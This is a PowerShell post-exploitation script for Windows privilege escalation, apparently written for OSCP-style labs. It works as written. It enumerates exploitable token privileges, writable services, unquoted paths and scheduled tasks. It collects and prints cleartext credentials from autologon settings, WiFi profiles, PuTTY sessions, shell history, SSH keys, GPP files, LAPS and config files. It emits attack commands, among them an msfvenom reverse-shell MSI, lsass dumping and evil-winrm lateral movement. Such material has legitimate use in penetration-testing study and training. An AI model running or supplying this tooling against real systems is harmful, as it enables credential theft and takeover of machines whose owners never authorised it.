# =============================================================================
# win-korek.ps1 - Privilege Escalation & Credential Enumeration
# Post-foothold local privilege escalation gap filler (pairs with winPEAS)
# Focused on OSCP: token privs, service misconfigs, credential recovery, AD
# Author: korek (upgraded)
# =============================================================================
# Usage:
#   . .\win-korek.ps1; Invoke-Korek
#   Invoke-Korek -OutputFile C:\Windows\Tasks\korek_out.txt
#   Invoke-Korek -Verbose
# =============================================================================

function Invoke-Korek {
    param(
        [string]$OutputFile = "",
        [switch]$Verbose = $false
    )

    $out = [System.Collections.ArrayList]@()
    $findings = [System.Collections.ArrayList]@()  # priority findings

    function Log  { 
        param([string]$m, [string]$c = "White")
        Write-Host $m -ForegroundColor $c
        if ($OutputFile) { $out.Add($m) | Out-Null }
    }
    function Hit  { param([string]$m) ; Log "[+] $m" "Green" ; $findings.Add("[+] $m") | Out-Null }
    function Hot  { param([string]$m) ; Log "[!!] $m" "Red" ; $findings.Add("[!!] $m") | Out-Null }
    function Info { param([string]$m) ; Log "    >>> $m" "Gray" }
    function Sec  { param([string]$m) ; Log "`n[*] === $m ===" "Cyan" }
    function Expl { param([string]$m) ; Log "    [EXPLOIT] $m" "Yellow" }
    function DBG  { param([string]$m) ; if ($Verbose) { Log "    [DBG] $m" "DarkGray" } }

    function Get-FileSafe {
        param([string]$p)
        try {
            if (Test-Path $p -ErrorAction Stop) {
                $f = Get-Item $p -ErrorAction Stop
                if ($f.Length -gt 0 -and -not $f.PSIsContainer) { return $f }
            }
        } catch {}
        return $null
    }
    function Get-ContentSafe {
        param([string]$p, [int]$n = 30)
        try { return Get-Content $p -ErrorAction Stop -TotalCount $n }
        catch {}
        return $null
    }
    function Get-Reg {
        param([string]$p, [string]$k)
        try { return (Get-ItemProperty $p -Name $k -ErrorAction Stop).$k }
        catch {}
        return $null
    }
    function Test-PathWritable {
        param([string]$path)
        try {
            $testFile = [System.IO.Path]::GetTempFileName()
            Copy-Item $testFile $path -ErrorAction Stop
            Remove-Item "$path\*" -ErrorAction SilentlyContinue
            return $true
        } catch {}
        return $false
    }

    Log "============================================================" "Cyan"
    Log "  win-korek.ps1 - Privilege Escalation Gap Filler" "Cyan"
    Log "  Token privs | Service misconfigs | Credentials | AD" "Cyan"
    Log "  Run AFTER winPEAS for complete local enum coverage" "Cyan"
    Log "============================================================" "Cyan"

    # ------------------------------------------------------------------
    # CONTEXT
    # ------------------------------------------------------------------
    Sec "CONTEXT"
    $whoami = whoami
    Log "User: $whoami" "White"
    $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    if ($isAdmin) { Hot "Running as ADMINISTRATOR" } else { Info "Not running as admin (UAC may block some checks)" }
    $isSystem = $whoami -eq "nt authority\system"
    if ($isSystem) { Hot "Running as SYSTEM" }
    $isDomain = -not ([string]::IsNullOrEmpty($env:USERDNSDOMAIN))
    if ($isDomain) { Hit "Domain-joined: $env:USERDNSDOMAIN" } else { Info "Not domain-joined (standalone)" }

    # ------------------------------------------------------------------
    # TOKEN PRIVILEGES (the potato decision tree)
    # ------------------------------------------------------------------
    Sec "TOKEN PRIVILEGES (potato/privesc viability)"
    try {
        $privs = whoami /priv /fo csv 2>$null | ConvertFrom-Csv
        $hasSeImpersonate = $false
        $hasSeAssignPrimary = $false
        $hasSeDebug = $false
        $hasSeBackup = $false

        $privs | ForEach-Object {
            $name = $_."Privilege Name"
            $state = $_."State"
            if ($state -match "Enabled") {
                if ($name -eq "SeImpersonatePrivilege") {
                    Hot "SeImpersonatePrivilege ENABLED → JuicyPotato/GodPotato viable"
                    Expl "JuicyPotatoNG.exe / GodPotato / PrintSpoofer / SigmaPotato"
                    $hasSeImpersonate = $true
                }
                if ($name -eq "SeAssignPrimaryTokenPrivilege") {
                    Hot "SeAssignPrimaryTokenPrivilege ENABLED → token swapping viable"
                    Expl "JuicyPotato / JuicyPotatoNG.exe"
                    $hasSeAssignPrimary = $true
                }
                if ($name -eq "SeDebugPrivilege") {
                    Hot "SeDebugPrivilege ENABLED → process injection / MinidumpWriteDump viable"
                    Expl "lsass dump → secretsdump.py"
                    $hasSeDebug = $true
                }
                if ($name -eq "SeBackupPrivilege") {
                    Hot "SeBackupPrivilege ENABLED → can read SAM/SYSTEM/NTDS"
                    Expl "copy C:\Windows\System32\config\SAM ; robocopy C:\Windows\System32\config C:\temp /S /SE"
                    $hasSeBackup = $true
                }
                if ($name -eq "SeTakeOwnershipPrivilege") {
                    Hit "SeTakeOwnershipPrivilege ENABLED → can own/modify files"
                }
                if ($name -eq "SeLoadDriverPrivilege") {
                    Hot "SeLoadDriverPrivilege ENABLED → arbitrary kernel code execution"
                    Expl "AtlasDriver / Capcom / ExploitDB kernel exploit"
                }
            }
        }
        if (-not ($hasSeImpersonate -or $hasSeAssignPrimary -or $hasSeDebug -or $hasSeBackup)) {
            Info "No high-value token privileges — focus on service misconfigs / unquoted paths"
        }
    } catch {
        DBG "whoami /priv failed: $_"
    }

    # ------------------------------------------------------------------
    # AV / DEFENDER STATE
    # ------------------------------------------------------------------
    Sec "ANTIVIRUS & DEFENDER STATE"
    try {
        $defender = Get-MpComputerStatus -ErrorAction SilentlyContinue
        if ($defender) {
            if ($defender.RealTimeProtectionEnabled) {
                Hit "Windows Defender REAL-TIME PROTECTION ENABLED — payloads may be blocked"
                Info "RealTimeProtectionEnabled: $($defender.RealTimeProtectionEnabled)"
                Info "IsTamperProtected: $($defender.IsTamperProtected)"
            } else {
                Info "Defender RealTime disabled (better for payload delivery)"
            }
            if ($defender.AntivirusEnabled) { Info "Antivirus: $($defender.AntivirusEnabled)" }
        }
    } catch {
        DBG "Get-MpComputerStatus failed (may indicate old/disabled Defender): $_"
    }

    # ------------------------------------------------------------------
    # WRITABLE SERVICE BINARIES (actual test, not just "check icacls")
    # ------------------------------------------------------------------
    Sec "WRITABLE SERVICE BINARIES (actively tested)"
    try {
        $services = Get-WmiObject Win32_Service -ErrorAction SilentlyContinue |
            Where-Object { $_.PathName -ne $null -and $_.PathName -ne "" }

        $writableCount = 0
        $services | ForEach-Object {
            $svc = $_
            $pathRaw = $svc.PathName
            # strip quotes and args
            $path = $pathRaw -replace '^"([^"]+)".*', '$1'
            if (-not (Test-Path $path -ErrorAction SilentlyContinue)) { return }

            # test if writable
            try {
                $acl = Get-Acl $path -ErrorAction Stop
                $identity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
                $principal = [System.Security.Principal.WindowsPrincipal]$identity

                $hasWrite = $false
                foreach ($access in $acl.Access) {
                    if ($principal.IsInRole($access.IdentityReference) -and
                        ($access.FileSystemRights -match "Write|Modify|FullControl" -and
                         $access.AccessControlType -eq "Allow")) {
                        $hasWrite = $true; break
                    }
                }
                if ($hasWrite) {
                    Hot "WRITABLE: Service '$($svc.Name)' binary: $path"
                    Info "Runs as: $($svc.StartName)"
                    Expl "cp malicious.exe '$path' ; Restart-Service $($svc.Name)"
                    $writableCount++
                }
            } catch {
                DBG "ACL check failed for $path : $_"
            }
        }
        if ($writableCount -eq 0) { Info "No directly-writable service binaries found" }
    } catch {
        DBG "Service binary check failed: $_"
    }

    # ------------------------------------------------------------------
    # UNQUOTED SERVICE PATHS (exploitable write paths)
    # ------------------------------------------------------------------
    Sec "UNQUOTED SERVICE PATHS"
    try {
        $unquoted = Get-WmiObject Win32_Service -ErrorAction SilentlyContinue |
            Where-Object {
                $_.PathName -notmatch '"' -and
                $_.PathName -match ' ' -and
                $_.PathName -notmatch "^C:\\Windows" -and
                $_.PathName -ne $null
            }

        $unquoted | ForEach-Object {
            Hot "Unquoted: '$($_.Name)' -> $($_.PathName)"
            Info "Runs as: $($_.StartName)"
            $pathParts = ($_.PathName -split ' ')[0..1] -join ' '
            Info "Exploitable: place exe before space: $pathParts"
            Expl "icacls 'C:\Program Files\App\' to check write perms"
        }
    } catch {
        DBG "Unquoted service check failed: $_"
    }

    # ------------------------------------------------------------------
    # SCHEDULED TASKS RUNNING AS SYSTEM/HIGH (writable tasks)
    # ------------------------------------------------------------------
    Sec "SCHEDULED TASKS (SYSTEM/HIGH privilege)"
    try {
        $tasks = Get-ScheduledTask -ErrorAction SilentlyContinue | Where-Object {
            $_.Principal.UserId -match "SYSTEM|S-1-5-18" -or
            $_.Principal.RunLevel -eq "Highest"
        }

        $tasks | ForEach-Object {
            $task = $_
            $taskPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\$($task.TaskName)"
            Hit "Scheduled Task: $($task.TaskName)"
            Info "RunLevel: $($task.Principal.RunLevel) | User: $($task.Principal.UserId)"

            try {
                $action = $task.Actions[0]
                if ($action) {
                    $exe = $action.Execute
                    Info "Execute: $exe"
                    if (Test-Path $exe -ErrorAction SilentlyContinue) {
                        $acl = Get-Acl $exe -ErrorAction SilentlyContinue
                        $identity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
                        $principal = [System.Security.Principal.WindowsPrincipal]$identity
                        foreach ($access in $acl.Access) {
                            if ($principal.IsInRole($access.IdentityReference) -and
                                $access.FileSystemRights -match "Write|Modify" -and
                                $access.AccessControlType -eq "Allow") {
                                Expl "WRITABLE TASK EXECUTABLE: $exe → replace with malicious.exe"
                            }
                        }
                    }
                }
            } catch {}
        }
    } catch {
        DBG "Scheduled tasks check failed: $_"
    }

    # ------------------------------------------------------------------
    # 1. SAM/SYSTEM/NTDS BACKUPS
    # ------------------------------------------------------------------
    Sec "SAM / SYSTEM / NTDS BACKUPS"
    @(
        "C:\Windows\System32\config\RegBack\SAM",
        "C:\Windows\System32\config\RegBack\SYSTEM",
        "C:\Windows\System32\config\RegBack\SECURITY",
        "C:\windows.old\Windows\System32\SAM",
        "C:\windows.old\Windows\System32\SYSTEM",
        "C:\windows.old\Windows\System32\SECURITY",
        "C:\windows.old\Windows\System32\config\SAM",
        "C:\windows.old\Windows\System32\config\SYSTEM",
        "C:\windows.old\Windows\System32\config\SECURITY",
        "C:\Windows\NTDS\ntds.dit"
    ) | ForEach-Object {
        $f = Get-FileSafe $_
        if ($f) {
            Hot "$_ ($($f.Length) bytes)"
            Expl "download then: impacket-secretsdump -sam SAM -system SYSTEM LOCAL"
        }
    }

    # ------------------------------------------------------------------
    # 2. POWERSHELL HISTORY (credential-focused grep)
    # ------------------------------------------------------------------
    Sec "POWERSHELL HISTORY (high-value credential patterns)"
    try {
        Get-Item "C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -ErrorAction SilentlyContinue |
        Where-Object { $_.Length -gt 0 } | ForEach-Object {
            Hit "History file: $($_.FullName)"
            $content = Get-ContentSafe $_.FullName 500
            if ($content) {
                # grep only the high-signal lines
                $content | Where-Object {
                    $_ -match "(?i)(password|passwd|pwd|cred|secret|token|key|api.?key|auth|bearer|runas|invoke-.*-password|iwr.*-credential|-pw\s|net\s+use|Start-Process.*-credential)" -and
                    $_ -notmatch "^#|^//|<!-- |echo.*password"
                } | ForEach-Object {
                    Hot "INTERESTING: $_"
                    if ($_ -match "-pw\s+'?([^'\s]+)'?") { Hot "PASSWORD EXTRACTED: $($Matches[1])" }
                    if ($_ -match "(?i)password['\"]?\s*=\s*['\"]?([^'\"]+)") { Hot "CRED FOUND: $($Matches[1])" }
                }
            }
        }
    } catch {}

    # ------------------------------------------------------------------
    # 3. PUTTY / WINSCP SAVED SESSIONS (session method + direct values)
    # ------------------------------------------------------------------
    Sec "PUTTY / WINSCP SAVED SESSIONS"
    try {
        $puttyBase = "HKCU:\Software\SimonTatham\PuTTY\Sessions"
        if (Test-Path $puttyBase -ErrorAction SilentlyContinue) {
            $puttySessions = Get-ChildItem $puttyBase -ErrorAction SilentlyContinue
            if ($puttySessions) {
                $puttySessions | ForEach-Object {
                    $sessionName = $_.PSChildName
                    $h = Get-Reg $_.PSPath "HostName"
                    $u = Get-Reg $_.PSPath "UserName"
                    $p = Get-Reg $_.PSPath "PublicKeyFile"
                    if ($h) {
                        Hit "PuTTY Session: $sessionName"
                        Info "Host: $h | User: $u"
                        if ($p) { Info "KeyFile: $p" }
                        Expl "ssh -i keyfile $u@$h"
                    }
                    # grep registry values for -pw patterns
                    try {
                        Get-ItemProperty $_.PSPath -ErrorAction Stop |
                        Select-Object -Property * -ExcludeProperty PS* |
                        Get-Member -MemberType NoteProperty -ErrorAction SilentlyContinue |
                        ForEach-Object {
                            $val = (Get-ItemProperty "$puttyBase\$sessionName" -ErrorAction SilentlyContinue).$($_.Name)
                            if ($val -match "-pw\s+'?([^'\s]+)'?") {
                                Hot "PASSWORD IN PUTTY CONFIG: $($Matches[1])"
                                Expl "$u@$h / $($Matches[1])"
                            }
                        }
                    } catch {}
                }
            }
        }
    } catch {}

    try {
        $winscpSessions = Get-ChildItem "HKCU:\Software\Martin Prikryl\WinSCP 2\Sessions" -ErrorAction SilentlyContinue
        if ($winscpSessions) {
            $winscpSessions | ForEach-Object {
                $h = Get-Reg $_.PSPath "HostName"
                $u = Get-Reg $_.PSPath "UserName"
                $p = Get-Reg $_.PSPath "Password"
                if ($h) {
                    Hot "WinSCP Session: $($_.PSChildName) -> $h"
                    Info "User: $u"
                    Expl "WinSCP password (obfuscated): use https://github.com/anoopengineer/winscppasswd"
                }
            }
        }
    } catch {}

    # ------------------------------------------------------------------
    # 4. WIFI PASSWORDS
    # ------------------------------------------------------------------
    Sec "WIFI PASSWORDS"
    try {
        $profiles = netsh wlan show profiles 2>$null | Select-String "Profile\s*:\s*(.+)"
        if ($profiles) {
            $profiles | ForEach-Object {
                $name = $_.Matches.Groups[1].Value.Trim()
                $key = netsh wlan show profile name="$name" key=clear 2>$null | Select-String "Key Content\s*:\s*(.+)"
                if ($key) {
                    Hot "WiFi '$name': $($key.Matches.Groups[1].Value.Trim())"
                }
            }
        }
    } catch {}

    # ------------------------------------------------------------------
    # 5. AUTOLOGON CREDENTIALS
    # ------------------------------------------------------------------
    Sec "AUTOLOGON CREDENTIALS (Winlogon LSA secret)"
    $autoUser = Get-Reg "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" "DefaultUserName"
    $autoPass = Get-Reg "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" "DefaultPassword"
    $autoDomain = Get-Reg "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" "DefaultDomainName"
    if ($autoPass) {
        Hot "AUTOLOGON CREDENTIALS FOUND!"
        Hit "Domain: $autoDomain | User: $autoUser"
        Expl "Password: $autoPass"
        Expl "evil-winrm -i TARGET -u '$autoUser' -p '$autoPass'"
        Expl "nxc smb TARGET -u '$autoUser' -p '$autoPass' --local-auth (try lateral move)"
    } else {
        Info "No autologon credentials found"
    }

    # ------------------------------------------------------------------
    # 6. CREDENTIAL MANAGER
    # ------------------------------------------------------------------
    Sec "CREDENTIAL MANAGER (cmdkey vault)"
    try {
        $creds = cmdkey /list 2>$null
        if ($creds -match "Target:|User") {
            $creds | Where-Object { $_ -match "Target:|User" } | ForEach-Object {
                Hit "Stored credential: $_"
            }
            Expl "runas /savecred /user:DOMAIN\USER cmd.exe   (reuse cred without typing password)"
        }
    } catch {}

    # ------------------------------------------------------------------
    # 7. SSH PRIVATE KEYS
    # ------------------------------------------------------------------
    Sec "SSH PRIVATE KEYS"
    @("C:\Users\*\.ssh\", "C:\Users\*\Documents\", "C:\Users\*\Desktop\", "C:\ProgramData\") | ForEach-Object {
        try {
            Get-ChildItem $_ -ErrorAction SilentlyContinue | Where-Object {
                $_.Name -match "^(id_rsa|id_dsa|id_ecdsa|id_ed25519)$|\.pem$|\.ppk$" -and $_.Length -gt 0
            } | ForEach-Object {
                Hot "SSH Key: $($_.FullName)"
                $c = Get-ContentSafe $_.FullName 3
                if ($c -match "PRIVATE") { Info "Contains PRIVATE KEY — steal it" }
                Expl "Transfer to Kali: ssh -i keyfile user@target"
            }
        } catch {}
    }

    # ------------------------------------------------------------------
    # 8. KEEPASS / PASSWORD FILES
    # ------------------------------------------------------------------
    Sec "KEEPASS / PASSWORD DATABASES"
    try {
        Get-ChildItem C:\ -Recurse -Depth 6 -ErrorAction SilentlyContinue |
        Where-Object { $_.Name -match "\.kdbx$|\.kdb$|^pass.*\.txt$|^cred.*\.txt$" -and $_.Length -gt 0 } |
        ForEach-Object {
            Hot "Password file: $($_.FullName) ($($_.Length) bytes)"
            Expl "Transfer to Kali and crack: keepass2john file.kdbx | hashcat -m 13400"
        }
    } catch {}

    # ------------------------------------------------------------------
    # 9. STICKY NOTES
    # ------------------------------------------------------------------
    Sec "STICKY NOTES (plum.sqlite)"
    try {
        Get-Item "C:\Users\*\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes*\LocalState\plum.sqlite" -ErrorAction SilentlyContinue |
        Where-Object { $_.Length -gt 0 } |
        ForEach-Object {
            Hot "Sticky Notes DB: $($_.FullName)"
            Expl "sqlite3 plum.sqlite 'SELECT Text FROM Note;'"
        }
    } catch {}

    # ------------------------------------------------------------------
    # 10. GPP PASSWORDS (SYSVOL)
    # ------------------------------------------------------------------
    Sec "GPP PASSWORDS IN SYSVOL"
    if ($isDomain) {
        try {
            $domain = $env:USERDNSDOMAIN
            $sysvol = "\\$domain\SYSVOL\$domain\Policies"
            if (Test-Path $sysvol -ErrorAction SilentlyContinue) {
                Get-ChildItem $sysvol -Recurse -ErrorAction SilentlyContinue |
                Where-Object { $_.Name -match "Groups|Services|ScheduledTasks|DataSources" -and $_.Name -match "\.xml$" } |
                ForEach-Object {
                    $c = Get-ContentSafe $_.FullName 50
                    if ($c -match "cpassword") {
                        Hot "GPP cpassword in: $($_.FullName)"
                        $c | Where-Object { $_ -match "cpassword" } | ForEach-Object { Info ">> $_" }
                        Expl "gpp-decrypt <cpassword value>"
                    }
                }
            }
        } catch {}
    } else {
        Info "Not domain-joined; GPP check skipped"
    }

    # ------------------------------------------------------------------
    # 11. APP CONFIG FILES WITH CREDENTIALS
    # ------------------------------------------------------------------
    Sec "APP CONFIG FILES (databases, web, creds)"
    @("C:\wamp", "C:\wamp64", "C:\xampp", "C:\inetpub", "C:\tomcat", "C:\Program Files", "C:\Program Files (x86)") | ForEach-Object {
        if (Test-Path $_ -ErrorAction SilentlyContinue) {
            try {
                Get-ChildItem $_ -Recurse -Depth 5 -ErrorAction SilentlyContinue |
                Where-Object {
                    $_.Name -match "web\.config|\.env|config\.php|database\.yml|appsettings\.json|tomcat-users\.xml|config\.ini" -and
                    $_.Length -gt 0 -and -not $_.PSIsContainer
                } |
                ForEach-Object {
                    Hit "Config: $($_.FullName)"
                    Get-ContentSafe $_.FullName 30 |
                    Where-Object { $_ -match "(?i)(pass|password|pwd|secret|key|token|user|connection)" -and $_ -notmatch "^#|^//" } |
                    ForEach-Object { Info ">> $($_.Trim())" }
                }
            } catch {}
        }
    }

    # ------------------------------------------------------------------
    # 12. SERVICES RUNNING AS DOMAIN USERS
    # ------------------------------------------------------------------
    Sec "SERVICES RUNNING AS DOMAIN USERS (lateral move targets)"
    if ($isDomain) {
        try {
            Get-WmiObject Win32_Service -ErrorAction SilentlyContinue |
            Where-Object {
                $_.StartName -notmatch "LocalSystem|LocalService|NetworkService|NT AUTHORITY|NT SERVICE" -and
                $_.StartName -ne $null -and $_.StartName -ne ""
            } | ForEach-Object {
                Hit "Service '$($_.Name)' runs as: $($_.StartName)"
                Info "Binary: $($_.PathName)"
                Expl "If you own this user account elsewhere → service is privesc target"
            }
        } catch {}
    }

    # ------------------------------------------------------------------
    # 13. LAPS (LDAP Active Directory Password Solution) SECRETS
    # ------------------------------------------------------------------
    Sec "LAPS SECRETS (if readable)"
    if ($isDomain) {
        try {
            $computerDN = ([ADSI]"LDAP://RootDSE").defaultNamingContext
            $searcher = [ADSISearcher]"(ms-Mcs-AdmPwd=*)"
            $results = $searcher.FindAll()
            if ($results.Count -gt 0) {
                $results | ForEach-Object {
                    $lapsPass = $_.Properties["ms-Mcs-AdmPwd"][0]
                    $computerName = $_.Properties["name"][0]
                    Hot "LAPS LOCAL ADMIN PASSWORD FOR: $computerName"
                    Hit "Password: $lapsPass"
                    Expl "Log in as Administrator@$computerName with this password"
                }
            }
        } catch {
            Info "LAPS not readable (expected; requires read permissions on computers)"
        }
    }

    # ------------------------------------------------------------------
    # 14. ALWAYSINSTALLELEVATED
    # ------------------------------------------------------------------
    Sec "ALWAYSINSTALLELEVATED (MSI elevation)"
    $aie1 = Get-Reg "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer" "AlwaysInstallElevated"
    $aie2 = Get-Reg "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" "AlwaysInstallElevated"
    if ($aie1 -eq 1 -and $aie2 -eq 1) {
        Hot "AlwaysInstallElevated is ENABLED → MSI privesc"
        Expl "msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f msi -o shell.msi"
        Expl "msiexec /quiet /qn /i shell.msi"
    } else {
        Info "AlwaysInstallElevated not enabled"
    }

    # ------------------------------------------------------------------
    # 15. INTERESTING FILES (flags, proofs, notes)
    # ------------------------------------------------------------------
    Sec "INTERESTING FILES (proof, flag, cred, note patterns)"
    try {
        Get-ChildItem "C:\Users\" -Recurse -ErrorAction SilentlyContinue |
        Where-Object {
            $_.Name -match "(?i)(proof|flag|pass|cred|secret|key|todo|note)" -and
            -not $_.PSIsContainer -and
            $_.Length -gt 0
        } |
        ForEach-Object {
            Hit "Interesting: $($_.FullName)"
            if ($_.Extension -match "txt|ini|xml|config|log") {
                Get-ContentSafe $_.FullName 10 | ForEach-Object { Info ">> $_" }
            }
        }
    } catch {}

    # ------------------------------------------------------------------
    # PRIORITY FINDINGS SUMMARY
    # ------------------------------------------------------------------
    Sec "PRIORITY FINDINGS (act on these first)"
    if ($findings.Count -gt 0) {
        $findings | Select-Object -Unique | ForEach-Object { Log $_ }
    } else {
        Info "No critical findings; escalate via service misconfig, unquoted paths, or scheduled tasks"
    }

    # ------------------------------------------------------------------
    # OUTPUT
    # ------------------------------------------------------------------
    if ($OutputFile) {
        try {
            $out | Out-File $OutputFile -Encoding UTF8
            Hit "Output saved: $OutputFile"
        } catch {
            Log "[-] Could not save to $OutputFile : $_" "Red"
        }
    }

    Log "`n[+] Done!" "Green"
    Log "    [!!] = Critical finding (ACT NOW)" "Red"
    Log "    [+]  = High-value finding" "Green"
    Log "    [EXPLOIT] = Exploitation command" "Yellow"
}
